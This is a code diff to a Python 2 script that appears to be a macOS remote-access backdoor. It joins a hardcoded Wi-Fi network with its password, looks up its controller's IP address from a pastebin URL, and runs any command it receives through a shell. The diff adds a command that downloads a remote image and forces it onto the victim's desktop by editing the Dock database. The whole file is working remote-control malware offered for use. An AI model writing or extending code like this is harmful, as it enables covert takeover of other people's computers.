@@ -5,18 +5,52 @@ import socket
 from time import sleep
 # import sys
 import sys
+import urllib
 
-#ip = sys.argv[1]
+# ip = sys.argv[1]
 # ip = '172.31.3.215'
 # ip = '192.168.10.145'
+
+# initialize drugs
+
 wifiConnection = 'networksetup -setairportnetwork en0 Fridaskolan vanersborg0521'
 print wifiConnection.split()
 subprocess.call(wifiConnection, shell=True)
 
+try:
+    url = 'https://pastebin.com/raw/SLGhJAhr'
+    response = urllib.urlopen(url)
+    if response.getcode() is 200:
+        ip = response.read()
+except:
+    pass
+
+
 def handlecommand(string):
-    res = subprocess.check_output(string, shell=True)
+    special = False
+    try:
+        print string.split()[0]
+        if string.split()[0] == """setbackground""":
+            special = True
+            if len(string.split()) is 3:
+                filename = string.split()[2]
+                f = open(filename, 'wb')
+                f.write(urllib.urlopen(string.split()[1]).read())
+                f.close()
+                pwd = subprocess.check_output("pwd", shell=True)
+                pwd = pwd[:-1]
+                newstr = """sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '""" + pwd + "/" + filename + """'";"""
+                print newstr
+                res = subprocess.check_output(newstr, shell=True)
+                subprocess.check_output("killall Dock", shell=True)
+    except:
+        return "failed"
+    if not special:
+        res = subprocess.check_output(string, shell=True)
     return res
 
+
+# setup steroids
 
 # Define the port on which you want to connect
 port = 6924
